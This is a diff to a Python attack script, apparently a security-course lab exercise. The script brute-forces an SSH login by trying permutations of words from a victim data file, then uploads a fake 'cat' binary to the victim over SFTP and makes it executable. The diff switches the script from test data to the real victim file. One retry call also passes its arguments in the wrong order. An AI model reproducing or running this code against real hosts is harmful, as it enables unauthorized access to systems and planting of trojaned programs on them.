@@ -26,7 +26,7 @@ def try_ssh_connection(hostname, username, password, port=22):
 		time.sleep(0.5)
 		return False
 	except paramiko.SSHException as sshException:
-# print(f"Unable to establish SSH connection: {sshException}")
+		# print(f"Unable to establish SSH connection: {sshException}")
 		time.sleep(10)
 		return try_ssh_connection(hostname, port, username, password)
 	except:
@@ -40,8 +40,8 @@ def try_ssh_connection(hostname, username, password, port=22):
 def crack_ssh_password():
 	global victim_ip, correct_password
 
-	# file_path = '/home/csc2022/materials/victim.dat'
-	file_path = './Test/test.dat'
+	file_path = '/home/csc2022/materials/victim.dat'
+	# file_path = './Test/test.dat'
 	
 	f = open(file_path)
 	tmp = f.readlines()
@@ -50,9 +50,6 @@ def crack_ssh_password():
 	for i in range(1, len(lin) + 1):
 		for j in itertools.permutations(lin, i):
 			now = ''.join(j)
-			
-			now = 'csc2022' # Testing Result
-
 			result = try_ssh_connection(
 				hostname = victim_ip,
 				username = 'csc2022',
@@ -77,10 +74,10 @@ def download_virus(client):
 	sftp = client.open_sftp()
 	
 	localpath = './fake_cat'
-	sftp.put(localpath, '/tmp/cat')
+	sftp.put(localpath, 'cat')
 	sftp.close()
 	
-	client.exec_command('chmod +x /tmp/cat')
+	client.exec_command('chmod +x cat')
 	client.close()
 	return
 
